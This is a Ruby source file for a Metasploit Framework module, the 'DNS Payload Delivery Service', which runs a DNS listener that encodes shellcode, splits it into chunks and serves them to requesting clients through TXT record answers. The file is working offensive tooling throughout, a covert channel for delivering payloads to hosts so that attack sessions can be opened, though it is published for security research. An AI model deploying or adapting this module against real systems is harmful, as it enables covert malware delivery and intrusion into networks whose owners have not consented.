##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'resolv'


class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Capture
    include Msf::Auxiliary::Report


    def initialize
        super(
            'Name'        => 'DNS Payload Delivery Service',
            'Version'     => '$Revision$',
            'Description'    => %q{
                This module is designed for out-of-band payload delivery.
                When started this module will create an DNS listener that monitors incoming DNS
                requests for a specified domain. Once a request is received the module will then
                encode the chosen payload and deliver it back to the source of the request as a
                DNS response. Larger payloads will be split amongst a number of sub-domains to keep
                within the size limits of UDP DNS reponses (576 bytes).

                A client-side script of application is required to make use of this module.
                The server-side portion is made available to allow further research into
                alternative shellcode delivery mechanisms.
            },
            'Author'      => 'Chris John Riley',
            'License'     => MSF_LICENSE,
            'References'    =>
                [
                    # general
                    ['URL', 'http://blog.c22.cc']
                ],
            'Payload'        =>
                    {
                            'BadChars'    => '',
                            'DisableNops' => true,
                            'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                            'EncoderOptions' =>
                                      {
                                        'BufferRegister' => 'EDI',
                                      }
                    },
            'Platform'       => [ 'win', 'linux', 'solaris', 'unix', 'osx', 'bsd', 'php', 'java' ],
            'Arch'           => ARCH_ALL,
            'Targets'        => [ [ 'Wildcard Target', { } ] ],
            'DefaultTarget'  => 0
        )

        register_options(
            [
                OptAddress.new('SRVHOST',   [ true, 'The local host to listen on.', '0.0.0.0' ]),
                OptPort.new('SRVPORT',      [ true, 'The local port to listen on.', 53 ]),
                OptString.new('DOMAIN',     [ true, 'The domain name to resolve (sub-domains will monitored)', '*' ]),
                OptString.new('SubDomainNaming', [true, 'Naming convention for sub-domains (HEX, ALPHA, NUM)', 'ALPHA']),
                OptString.new('ENCODING',   [ true, 'Specify alphanum/base32/base64 encoding', 'alphanum' ]),
                OptString.new('PREFIX',     [ false, 'Prepend value to shellcode delivery', '' ]),
                OptString.new('PREFIX_NUM', [ false, 'Assign numbers after prefix', false]),
            ], self.class)

        register_advanced_options(
            [
                OptBool.new('ExitOnSession', [ false, 'Return from the exploit after a session has been created', true ]),
                OptBool.new('ALLOW_PASSTHRU', [true, 'Allow A record requests to be passed on to be resolved', true]),
                OptInt.new('DNSTTL', [true, 'Custom DNS TTL to use on replies', 0]),
            ], self.class)

        deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
    end


    def exploit

        if not datastore['ExitOnSession'] and not job_id
            raise RuntimeError, "#{name}: Setting ExitOnSession to false requires running as a job (exploit -j)"
        end

        begin
            @port = datastore['SRVPORT'].to_i
            @host = datastore['SRVHOST']

            @domain = datastore['DOMAIN']
            @sdnaming = datastore['SubDomainNaming'].upcase
            @prefix = datastore['PREFIX']
            @prefix_num = datastore['PREFIX_NUM']
            @encoding = datastore['ENCODING'].downcase
            @ttl = datastore['DNSTTL'].to_i || 1

            print_status("#{name}: Monitoring requests for subdomains of %s" % @domain)
            # create and split up payload
            splitpayload

            # start listner
            print_status("#{name}: Starting DNS Server on %s:%s" % [@host, @port])
            dnslistener

        rescue  =>  ex
            print_error(ex.message)
        ensure
            print_status("#{name}: Stopping DNS Server on %s:%s" % [@host, @port])
        end
    end

    def dnslistener

        # MacOS X workaround
        ::Socket.do_not_reverse_lookup = true

        @sock = ::UDPSocket.new()
        @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
        @sock.bind(@host, @port)

        print_status("#{name}: DNS server started")

        begin
            while true
                packet, addr = @sock.recvfrom(65535)
                break if packet.length == 0

                request = Resolv::DNS::Message.decode(packet)
                @answer = Resolv::DNS::Message::new(request.id)
                @answer.qr = 1
                @answer.aa = 1
                @answer.opcode = request.opcode
                @answer.rd = request.rd
                @answer.ra = 0
                @answer.rcode = 0
                ttl = @ttl
                reply = false

                request.each_question {|hname, typeclass|
                    reply = false
                    @hname = hname.to_s
                    @record_type = typeclass.name.split("::").last

                if datastore['VERBOSE']
                    print_status("DNS: #{addr[3]}:#{addr[1]} ID: #{request.id} HOSTNAME: #{@hname} TYPE: #{@record_type}")
                end

                    case @record_type
                    when 'TXT'
                        if @domain == "*" or @hname.include?(@domain)
                            subdomain = @hname.split('.')
                            subdomain = subdomain[0].to_s.upcase
                            if @enc_payload["#{subdomain}"]
                                print_status("#{name}: Preparing answer with %d bytes of data" % @enc_payload["#{subdomain}"].length)
                                @answer.add_answer(@hname + ".", ttl, Resolv::DNS::Resource::IN::TXT.new(@enc_payload["#{subdomain}"]))
                                @answer.encode
                                print_good("#{name}: Delivering payload section %s via #{@record_type.to_s} record answer" % subdomain)
                                reply = true
                            else
                                print_error("#{name}: Received request for payload segment (%s) that doesn't exist" % subdomain)
                            end
                        else
                            print_debug("Ignoring request for %s as it's not in scope (*.%s)" % [@hname, @domain]) if datastore['VERBOSE']
                        end
#                    when 'HINFO'
#                        if @hname =~ /#{@domain}$/ or @domain == "*"
#                            subdomain = @domain.split('.')
#                            subdomain = subdomain[0].to_s.rjust(2, '0').upcase
#                            if @enc_payload["#{subdomain}"]
#                                @answer.add_answer(@hname + ".", ttl, Resolv::DNS::Resource::IN::HINFO.new(@enc_payload["#{subdomain}"], ''))
#                                @answer.encode
#                                print_good("#{name}: Delivering payload section %s via #{@record_type.to_s} record answer" % subdomain)
#                                reply = true
#                            else
#                                print_error("#{name}: Received request for payload segment (%s) that doesn't exist" % subdomain)
#                            end
#                        else
#                            print_debug("Ignoring request for %s as it's not in scope (*.%s)" % [@hname, @domain]) if datastore['VERBOSE']
#                        end
                    when 'A'
                        # pass thu lookup to another DNS server
                        if datastore['ALLOW_PASSTHRU']
                            resolv = pass_thru_lookup
                            reply = true if not resolv == 0
                        else
                            next
                        end
                    else
                        print_error("#{name}: Unsupported record type %s" % @record_type)
                    end
                }

                if reply
                    @sock.send(@answer.encode, 0, addr[3], addr[1])
                end

#                if @enc_payload.length == 0
#                    print_status("#{name}: All %d sections of shellcode delivered, waiting for session" % @split_payload.length)
#                    if datastore['ExitOnSession'] and not job_id
#                        if session_created?
#                            return
#                        else
#                            select(nil,nil,nil,3)
#                            return if session_created?
#                        end
#                        print_error("#{name}: No session created - Ending")
#                        return
#                    elsif not datastore['ExitOnSession'] or job_id
#                        print_status("#{name}: Running as background job - Creating new payload")
#                        splitpayload
#                    end
#                end
            end

        rescue ::Exception => e
            print_error("#{name}: #{e.class} #{e}")
        ensure
            # Make sure the socket gets closed on exit
            @sock.close
        end
    end

    def pass_thru_lookup
        print_debug("#{name}: Passing #{@hname} on to be resolved") if datastore['VERBOSE']

        begin
            ip = Resolv::DNS.new().getaddress(@hname).to_s
            resolv = Resolv::DNS::Resource::IN::A.new( ip )
            print_debug("#{name}: DNS bypass domain #{@hname} resolved #{ip}") if datastore['VERBOSE']
            @answer.add_answer(@hname, 60, resolv)
            @answer.encode
        rescue
            print_debug("#{name}: DNS bypass domain #{@hname} unable to resolve") if datastore['VERBOSE']
            resolv = 0
        end
        return resolv
    end

    def encodepayload
        # encode payload into Base64/Base32 as required

        p = payload.encoded
        if @encoding =~ /64$/
            enc_payload = Rex::Text.encode_base64(p)
            print_status("#{name}: Encoding payload using base64")
            return enc_payload
        elsif @encoding =~ /32$/
            enc_payload = Rex::Text.encode_base32(p)
            print_status("#{name}: Encoding payload using base32")
            return enc_payload
        elsif @encoding =~ /^alpha/i
            #no further encoding required
            enc_payload = p
            return enc_payload
        else
            raise RuntimeError , "Invalid encoding type"
        end
    end

    def splitpayload
        # split into chunks for delivery
        payload_size = 254 - @prefix.length
        tosplit = encodepayload
        @split_payload = []
        start = 0
        while start < tosplit.length
            @split_payload << tosplit[start..start+payload_size-1]
            start = start + payload_size
        end
        print_status("#{name}: Splitting payload into %d chunks" % @split_payload.length)
        listening_on = []
        @enc_payload = Hash.new
        if @prefix_num
            pnum = 0
            i = 1
            @split_payload.each do | epay |
                #@enc_payload << @prefix.to_s + pnum.to_s + epay
                val = subdomainnaming(i)
                listening_on << val
                @enc_payload["#{val}"] = @prefix.to_s + pnum.to_s + epay
                pnum = pnum+1
                i = i +1
            end
        else
            i = 1
            @split_payload.each do | epay |
                #@enc_payload << @prefix.to_s + epay
                val = subdomainnaming(i)
                listening_on << val
                @enc_payload["#{val}"] = @prefix.to_s + epay
                i = i +1
            end
        end

        if datastore['VERBOSE']
            i = 1
            @enc_payload.each do | shellcode |
                print_debug("#{name}: Split payload (Section %d, %d bytes in size) ::: \n%s" % [i, shellcode.length, shellcode])
                i = i +1
            end
        end

        print_status("#{name}: Listening for requests on {%s}.%s" % [listening_on.join(",").to_s, @domain.upcase])
        #@enc_payload.reverse!
    end

    def subdomainnaming(i)
        # assign sub-domains based on chosen naming convention (01,02,03...FF : A,B,C...Z : 1,2,3...255)
        case @sdnaming
        when 'HEX'
            val = i.to_s(16).to_s.rjust(2, '0').upcase
        when 'ALPHA'
            if i < 27
                val = (i + 64).chr if @sdnaming == 'ALPHA'
            else
                raise RuntimeError, "#{name}: Too many payload sections to use ALPHA naming for sub-domains"
            end
        when 'NUM'
            val = i.to_s if @sdnaming == 'NUM'
        else
            raise RuntimeError, "#{name}: Unknown Sub-Domain naming convention %s" % @sdnaming
        end
        return val
    end
end